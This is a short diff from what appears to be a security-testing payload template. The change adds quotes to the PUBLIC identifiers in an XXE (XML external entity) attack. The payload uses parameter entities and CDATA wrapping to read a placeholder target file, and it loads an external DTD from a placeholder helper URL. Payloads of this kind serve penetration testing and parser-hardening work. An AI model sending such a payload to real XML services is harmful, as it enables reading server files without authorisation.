@@ -27,9 +27,9 @@
 <!DOCTYPE data [
 <!ELEMENT data (#ANY)>
 <!ENTITY % start "<![CDATA[">
-<!ENTITY % goodies PUBLIC p "§tf_targetFILE§">
+<!ENTITY % goodies PUBLIC "p" "§tf_targetFILE§">
 <!ENTITY % end "]]]]><![CDATA[>">
-<!ENTITY % dtd PUBLIC p1 "§tf_helperURL§">
+<!ENTITY % dtd PUBLIC "p1" "§tf_helperURL§">
 %dtd;
 ]>
 <data>&all;</data>]]></directMessage>
